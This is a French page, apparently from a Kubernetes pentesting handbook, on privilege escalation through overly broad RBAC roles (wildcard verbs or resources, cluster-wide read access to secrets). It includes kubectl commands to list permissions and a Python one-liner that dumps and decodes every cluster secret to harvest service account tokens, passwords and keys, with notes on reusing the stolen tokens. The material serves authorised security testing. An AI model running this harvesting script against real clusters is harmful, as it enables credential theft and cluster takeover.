---
order: 1
title: "Rôles trop permissifs : élévation par des attributions trop larges"
description: "Les rôles qui accordent des verbes ou des ressources en wildcard, ou la capacité de lire les secrets à travers les namespaces, confèrent à une identité bien plus que prévu. Lire tous les secrets révèle les tokens d'autres identités et les identifiants applicatifs, et un rôle wildcard sur un namespace ou le cluster équivaut à un accès admin sur ce périmètre, sans astuce supplémentaire."
keywords:
  - rbac
  - rôle wildcard
  - get secrets
  - clusterrole
  - élévation de privilèges
---

# Rôles trop permissifs

L'élévation RBAC la plus simple est un rôle tout simplement trop large. Les opérateurs accordent des verbes `*` ou des ressources `*` par commodité, ou autorisent `get`/`list` sur `secrets` à l'échelle du cluster, et cette seule attribution constitue l'élévation. Lire les secrets expose le token de compte de service de toutes les autres identités ainsi que chaque identifiant applicatif stocké sous forme de secret ; un rôle wildcard est purement et simplement admin sur son périmètre.

Repérez les attributions larges dont dispose l'identité :

```bash
kubectl auth can-i --list                           # look for *, secrets, and cluster scope
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i '*' '*' --all-namespaces
```

## Lire les secrets pour récolter des identités

```bash
# dump every secret and decode it; token-type secrets are other SA tokens
kubectl get secrets --all-namespaces -o json | python3 -c '
import sys,json,base64
for s in json.load(sys.stdin)["items"]:
    for k,v in (s.get("data") or {}).items():
        try: val=base64.b64decode(v).decode("utf-8","replace")
        except Exception: continue
        if k=="token" or any(x in k.lower() for x in ("pass","key","secret")):
            print(s["metadata"]["namespace"], s["metadata"]["name"], k, val[:60])'
# a recovered SA token for a powerful account is used directly against the API
```

Un secret `kubernetes.io/service-account-token` contient un token non expirant pour son compte de service ; en lire un pour un compte à hauts privilèges (un contrôleur, ou tout élément lié à `cluster-admin`) constitue une élévation immédiate.

## Notes d'exploitation

- `get secrets` à l'échelle du cluster équivaut de fait à une compromission du cluster, car cela expose les tokens de chaque compte de service, y compris ceux liés à l'admin.
- Les rôles wildcard (`verbs: ["*"]`, `resources: ["*"]`) accordent implicitement les verbes d'élévation (`escalate`, `bind`, `impersonate`) ; considérez un wildcard comme un accès à toutes les autres voies de ce groupe.
- L'étendue au sein d'un namespace compte malgré tout : un Role wildcard dans `kube-system` atteint les comptes de service de contrôleurs dont les tokens sont puissants à l'échelle du cluster.
- Réinjectez les tokens récupérés dans [Token de compte de service vers l'API](../lateral-movement/service-account-token-to-api.md).

## Références

- [Kubernetes: RBAC good practices](https://kubernetes.io/docs/concepts/security/rbac-good-practices/)
- [Kubernetes: secrets](https://kubernetes.io/docs/concepts/configuration/secret/)
- [HackTricks: Kubernetes RBAC](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-role-based-access-control-rbac)
